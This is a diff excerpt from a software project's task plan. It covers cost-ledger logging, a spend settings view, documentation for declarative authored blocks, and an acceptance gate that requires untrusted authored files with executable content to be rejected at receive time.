+  - Extend the SQLite cost-ledger schema with the new category. Each call logs timestamp, model, tokens, computed cost, doc ID, category. No prompt/response content stored (D-32 boundary preserved).
+- **Acceptance:** authored-block-generation calls land in the ledger; D-32 constraints (no behavioural data) still hold.
+- **est.** 2h
+
+### T-177 [ ] · Settings → My LLM Spend view: surface the new category
+- **Depends-on:** T-176
+- **Outputs:**
+  - Add a row/section for `authored-block-generation` in the existing Settings → My LLM Spend view. Single bucket (no sub-categorisation per the simplified D-34 amendment).
+- **Acceptance:** the new category's spend is visible; existing category views unchanged.
+- **est.** 1h
+
+### T-179 [ ] · Update `docs/BLOCK_IMPLEMENTATION_GUIDE.md` for the `defineAuthoredBlock` pattern
+- **Depends-on:** T-159
+- **Outputs:**
+  - New section in the guide covering the `defineAuthoredBlock` declarative pattern. Cross-references the `reference/authored-block/` scaffold from T-159 + ADR-0013 (declarative data, not executable code). Distinguishes from the imperative `defineBlock` pattern (which now points at the rewritten `reference/callout/` from T-138).
+- **Acceptance:** a developer reading the guide can author a Standard, Brand, or Authored block correctly without consulting the source code.
+- **est.** 2h
+
+**M9b acceptance gate:** a consultant can create an Authored block in-document, preview it, share it via the OS share-sheet; a recipient can drag the `.tsx` onto the app window and have it install (or quarantine with a clear reason); scaffold-mismatch surfaces the Regenerate flow; archive / restore / permanently-delete IPC commands work; cost ledger logs the new category; an integration test covers the full author → share → receive → render flow. **Security regression:** an Authored `.tsx` with arbitrary top-level statements, function values inside the manifest, or any AST node outside the literal-only shape is rejected at receive time — never executed (negative-path fixtures in `tests/blocks/authored/malicious-fixtures/`).
+
+**T-178 removed** — folded into T-167 (TAURI_IPC.md update done as T-167 step 6).
+
+---
+
+## Phase 11 — Deployment & Release
 
 ### T-108 [!] · Set up code signing (macOS, Windows) ← waiting: requires real macOS/Windows signing certificates and CI secrets
 - **Outputs:** signing certs in CI secrets; signed build outputs
